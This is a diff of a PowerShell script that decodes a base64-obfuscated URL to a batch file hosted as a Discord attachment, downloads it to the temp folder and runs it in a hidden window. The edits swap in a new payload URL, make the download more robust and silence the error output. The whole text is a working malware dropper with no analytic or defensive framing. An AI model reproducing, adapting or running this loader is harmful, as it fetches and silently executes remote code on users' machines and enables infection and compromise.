@@ -1,9 +1,9 @@
-$ffff = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0OTA1NDAxNTAzNjk4MTI2OS8xMTUwNDE3NjAyMjUwODEzNjAxL1VuaS5iYXQ="
+$ffff = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTE0OTA5OTg1NTMyMTg4MDk0LzExNTA0MTc2MDIyNTA4MTM2MDEvVW5pLmJhdA=="
 $Url = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ffff))
 
 $OutputPath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "djdyakht.bat")
 
-Invoke-WebRequest -Uri $Url -OutFile $OutputPath | Out-Null
+Invoke-WebRequest -Uri $Url -OutFile $OutputPath -UseBasicParsing | Out-Null
 
 if (Test-Path $OutputPath) {
     Start-Job -ScriptBlock {
@@ -11,5 +11,5 @@ if (Test-Path $OutputPath) {
         Start-Process -FilePath $FilePath -WindowStyle Hidden
     } -ArgumentList $OutputPath | Out-Null
 } else {
-    Write-Host "Unknown Error."
+    Write-Host "Unknown Error." | Out-Null
 }
